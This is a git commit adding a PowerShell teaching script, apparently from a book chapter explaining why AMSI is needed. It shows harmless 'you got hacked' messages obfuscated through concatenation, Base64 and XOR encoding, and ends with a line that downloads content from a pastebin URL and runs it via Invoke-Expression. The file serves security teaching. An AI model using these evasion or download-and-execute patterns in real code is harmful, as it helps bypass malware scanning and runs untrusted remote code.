67d45970e1d3fc1238b1983b4877db717b400610
Miriam Wiesner <miriamxyra@users.noreply.github.com>
2022-02-13 19:07:37 +0100

    Added Examples_whyAMSI.ps1

---
+++ Chapter11/Examples_whyAMSI.ps1
@@ -0,0 +1,64 @@
+﻿# Example 1
+Function Invoke-MaliciousScript {
+    Write-Host "Y0u g0t h4ck3d!"
+}
+Invoke-MaliciousScript
+
+# Example 2
+Function Invoke-MaliciousScript {
+    $a = 4
+    $output = "Y0" + "u g" + "0t h" + $a + "ck" + ($a - 1) + "d!"
+    Write-Host $output
+}
+Invoke-MaliciousScript 
+
+# Example 3 - Encoding
+Function Invoke-MaliciousScript {
+    $string = "Y0u g0t h4ck3d!"
+    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($string)
+    $output =[Convert]::ToBase64String($Bytes)
+
+    Write-Host $output
+}
+Invoke-MaliciousScript 
+
+# Example 3 - Decoding
+Function Invoke-MaliciousScript {
+    $string = "WQAwAHUAIABnADAAdAAgAGgANABjAGsAMwBkACEA"
+    $output = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($string))
+
+    Write-Host $output
+}
+Invoke-MaliciousScript
+
+# Example 4 - Encoding
+Function Invoke-MaliciousScript {
+    $string = "Y0u g0t h4ck3d!"
+    $key = 0x12
+
+    $bytes = [system.Text.Encoding]::UTF8.GetBytes($string)
+    $xor = $bytes | ForEach-Object { [char] ($_ -bxor $key)}
+    $output =[System.Convert]::ToBase64String($xor)
+
+    Write-Host $output
+}
+Invoke-MaliciousScript 
+
+# Example 4 - Decoding
+Function Invoke-MaliciousScript {
+    $string = "SyJnMnUiZjJ6JnF5IXYz"
+    $key = 0x12
+	
+    $bytes = [System.Convert]::FromBase64String($string)
+    $output = -join ($bytes | ForEach-Object { [char] ($_ -bxor $key)})
+
+    Write-Host $output
+}
+Invoke-MaliciousScript
+
+# Example 5
+Function Invoke-MaliciousScript {
+    $output = Invoke-WebRequest https://pastebin.com/raw/dJHXViQw
+    Invoke-Expression $output
+}
+Invoke-MaliciousScript
